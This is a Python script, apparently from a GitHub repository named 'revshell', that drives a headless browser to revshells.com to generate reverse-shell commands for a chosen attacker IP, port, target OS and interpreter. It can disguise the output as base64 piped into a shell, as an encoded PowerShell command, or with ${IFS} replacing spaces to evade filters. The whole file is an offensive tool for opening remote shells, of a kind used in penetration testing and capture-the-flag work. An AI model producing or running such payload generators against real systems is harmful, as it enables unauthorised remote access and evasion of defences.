#!/usr/bin/python3
"""
download from:
https://github.com/esp0xdeadbeef/revshell
"""

import argparse
import logging
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select, WebDriverWait


def get_shell(driver, shell_type=''):
    shells_table = WebDriverWait(driver, 10).until(
        EC.visibility_of_element_located((By.ID, 'reverse-shell-selection'))
    )
    shells = shells_table.find_elements_by_tag_name('button')
    for shell in shells:
        if shell_type.lower() == shell.text.lower():
            shell.click()
            while driver.find_element_by_id('reverse-shell-command').text == None:
                pass
            retval = driver.find_element_by_id('reverse-shell-command').text
            return retval

    shells = shells_table.find_elements_by_tag_name('button')
    print('Invalid selection, valid choices are:\n"', end='')
    for counter, shell in enumerate(shells):
        if counter < (len(shells) - 1):
            print(shell.text, end='", "')
        else:
            print(shell.text, end='"\n')
    return get_shell(driver, shell_type=input('Shell type: '))


def replace_val(id_name, value):
    ip_box = driver.find_element_by_id(id_name)
    ip_box.send_keys(Keys.CONTROL + "a")
    ip_box.send_keys(value)


def change_id_dropbox(driver, id, value, alternative_input_string=f"{id}INPUT: "):
    # sometimes was bugging out, so wait untill the id is visable.
    WebDriverWait(driver, 10).until(
        EC.visibility_of_element_located((By.ID, id))
    )
    select = Select(driver.find_element_by_id(id))
    for i in select.options:
        if len(select.options) > 1 and value.lower() in i.text.lower():
            select.select_by_visible_text(i.text)
            return i.text
    print('Options: ', end='[')
    for counter, i in enumerate(select.options):
        if counter < (len(select.options) - 1):
            print(i.text, end=",")
        else:
            print(i.text + ']')
    return change_id_dropbox(driver, id=id, value=input(alternative_input_string), alternative_input_string=alternative_input_string)


def select_operation_system(driver, operation_system=""):
    change_id_dropbox(driver, 'os-options', operation_system,
                      alternative_input_string='OS: ')


def select_shell(driver, operation_system=""):
    return change_id_dropbox(driver, 'shell', operation_system,
                             alternative_input_string='Shell: ')


def edit_payload(payload, shell_type, base64_location_target="base64", operation_system="", white_spaces=" ", base_it=False):
    payload = payload.replace(' ', white_spaces)
    # print(payload)
    if not(base_it):
        return payload
    if 'win' in operation_system:
        import base64
        return f"powershell -noP -sta -w 1 -enc {base64.b64encode(payload.encode('utf16')[2:]).decode()}"
    else:
        import base64
        return f"echo {base64.b64encode(payload.encode()).decode()} | {base64_location_target} -d | {shell_type}"


def main(driver, args):
    driver.get(args.url)
    replace_val('ip', args.ip_adress)
    replace_val('port', args.port)
    # print("operation_system: " + args.target_operation_system)
    select_operation_system(driver, args.target_operation_system)
    # print("shelltype: " + args.shell_type)
    selected_shell = select_shell(driver, args.shell_type)
    # print("interpeter_type: " + args.interpeter_type)
    shell = get_shell(driver, args.interpeter_type)
    shell_edit = edit_payload(
        shell, operation_system=args.target_operation_system,
        white_spaces=args.white_spaces,
        shell_type=selected_shell,
        base_it=args.base64_payload
    )
    print(shell_edit)

    # import code
    # code.interact(local=locals())


def str2bool(v):
    if isinstance(v, bool):
        return v
    if v.lower() in ('yes', 'true', 't', 'y', '1'):
        return True
    elif v.lower() in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-ip",
        "--ip-adress",
        default="10.10.10.10",
        help="Debugging level"
    )
    parser.add_argument(
        "-port",
        "--port",
        default="9001",
        help="Port for the rev shell to land on."
    )
    parser.add_argument(
        "-os",
        "--target-operation-system",
        default="All",
        help="Debugging level"
    )
    parser.add_argument(
        "-st",
        "--shell-type",
        default="bin/bash",
        help="shell type (bin/zsh/...)"
    )

    parser.add_argument(
        "-b",
        "--base64-payload",
        type=str2bool,
        default=False,
        help="base payload, depends on os. (default base64. windows with utf16 encoding)"
    )

    parser.add_argument(
        "-it",
        "--interpeter-type",
        default="",
        help="interpeter type (python/php/rust/...)"
    )
    parser.add_argument(
        "-c",
        "--use-chrome",
        type=str2bool,
        default=False,
        help="Use chrome, default False (default: firefox with geckodriver_autoinstaller)"
    )
    parser.add_argument(
        "-ifs",
        '--white-spaces',
        default=" ",
        help="rename all spaces to the input value (think about ${IFS})"
    )
    parser.add_argument("-u",
                        "--url",
                        default="https://www.revshells.com/",
                        help="""Url of revshells.com or somewhere local.
git clone https://github.com/0dayCTF/reverse-shell-generator;
docker run --rm -it -p 80:80 reverse_shell_generator;
docker run --rm -it -p 80:80 reverse_shell_generator
                        """)
    args = parser.parse_args()
    logging.debug(args.url)
    if args.use_chrome:
        from selenium.webdriver import ChromeOptions
        opts = ChromeOptions()
        opts.add_argument("--headless")
        with webdriver.Chrome(options=opts) as driver:
            main(driver, args)
    else:
        import geckodriver_autoinstaller
        geckodriver_autoinstaller.install()
        from selenium.webdriver import FirefoxOptions
        opts = FirefoxOptions()
        opts.add_argument("--headless")
        with webdriver.Firefox(options=opts) as driver:
            main(driver, args)
